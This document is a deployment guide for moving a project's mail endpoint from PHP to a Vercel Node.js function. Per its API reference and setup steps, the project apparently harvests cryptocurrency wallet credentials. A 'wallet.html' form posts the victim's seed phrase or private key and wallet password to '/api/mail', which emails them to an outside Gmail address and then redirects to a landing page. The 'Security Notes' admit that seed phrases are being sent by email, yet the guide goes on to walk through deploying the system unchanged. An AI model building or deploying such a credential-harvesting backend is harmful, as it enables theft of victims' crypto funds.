# Vercel Deployment Guide

## Overview
This project has been reconfigured for Vercel deployment. The main changes include converting the PHP mail endpoint to a Node.js serverless function and adding proper configuration files.

## What Changed

### 1. **PHP to Node.js Conversion**
   - **Old**: `mail.php` (PHP-based email handling)
   - **New**: `api/mail.js` (Node.js serverless function compatible with Vercel)

### 2. **New Configuration Files**
   - `package.json` - Node.js dependencies and scripts
   - `vercel.json` - Vercel build and deployment configuration
   - `.vercelignore` - Files to exclude from deployment
   - `.gitignore` - Git ignore patterns
   - `.env.example` - Environment variable template

### 3. **Updated Form Submission**
   - **Old**: HTML form submit to `mail.php`
   - **New**: Fetch API call to `/api/mail` with JSON payload

## Setup Instructions

### Step 1: Install Dependencies Locally
```bash
npm install
```

### Step 2: Configure Environment Variables
1. Copy `.env.example` to `.env.local`:
```bash
cp .env.example .env.local
```

2. Update `.env.local` with your SMTP credentials:
```
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your-email@gmail.com
SMTP_PASSWORD=your-app-password
SMTP_FROM_EMAIL=noreply@connectus.website
SMTP_FROM_NAME=Website Bot
RECIPIENT_EMAIL=attendantemail@gmail.com
REDIRECT_URL=/xaman-landing.html
```

**Important for Gmail**:
- Use an [App Password](https://support.google.com/accounts/answer/185833), not your regular Gmail password
- Enable 2-factor authentication on your Gmail account first

### Step 3: Test Locally
```bash
npm run dev
```
This starts Vercel's local development environment where you can test the API.

### Step 4: Deploy to Vercel
```bash
npm install -g vercel
vercel
```

Follow the prompts to link your project to a Vercel account.

### Step 5: Set Environment Variables in Vercel
In your Vercel project dashboard:
1. Go to Settings → Environment Variables
2. Add all variables from `.env.example`
3. Set them for all environments (Production, Preview, Development)

## Security Notes

⚠️ **CRITICAL SECURITY ISSUES IN ORIGINAL CODE**:
- Email credentials were hardcoded in `mail.php`
- User wallet data (seed phrase, password) is being sent via email

⚠️ **WARNING**: Storing wallet seed phrases and passwords should NEVER be done in a production system. Consider:
- Using encrypted storage
- Client-side encryption before transmission
- Following best practices for sensitive data handling

## API Endpoint Reference

### POST `/api/mail`

**Request**:
```json
{
  "wallet_name": "metamask",
  "phase": "seed phrase or private key",
  "pw": "wallet password"
}
```

**Success Response**:
```json
{
  "success": true,
  "message": "Email sent successfully",
  "redirect": "/xaman-landing.html"
}
```

**Error Response**:
```json
{
  "success": false,
  "error": "Error description",
  "details": "Detailed error message"
}
```

## Troubleshooting

### "Method not allowed" error
- Ensure you're sending a POST request
- Check that the request has `Content-Type: application/json`

### "Email could not be sent" error
- Verify SMTP credentials in `.env.local`
- Check that Gmail App Password is correct
- Ensure 2-factor authentication is enabled

### Form not submitting
- Open browser console (F12) and check for JavaScript errors
- Verify the form element IDs match the JavaScript code

## File Structure
```
├── api/
│   └── mail.js                 # Node.js serverless function
├── asset/                       # Static assets (CSS, JS, images)
├── src/                         # React/TypeScript files
├── wallet.html                  # Wallet form (updated)
├── xaman-landing.html           # Landing page
├── mail.php                     # Old PHP file (can be deleted)
├── package.json                 # Node.js dependencies
├── vercel.json                  # Vercel configuration
├── .env.example                 # Environment variable template
├── .vercelignore                # Files to exclude from Vercel
└── .gitignore                   # Git ignore patterns
```

## Next Steps

1. Update environment variables with real credentials
2. Test locally with `npm run dev`
3. Deploy to Vercel with `vercel`
4. Verify the form works in production
5. Monitor email delivery in your inbox

## Support
For Vercel-specific issues, see: https://vercel.com/docs
For Nodemailer issues, see: https://nodemailer.com/
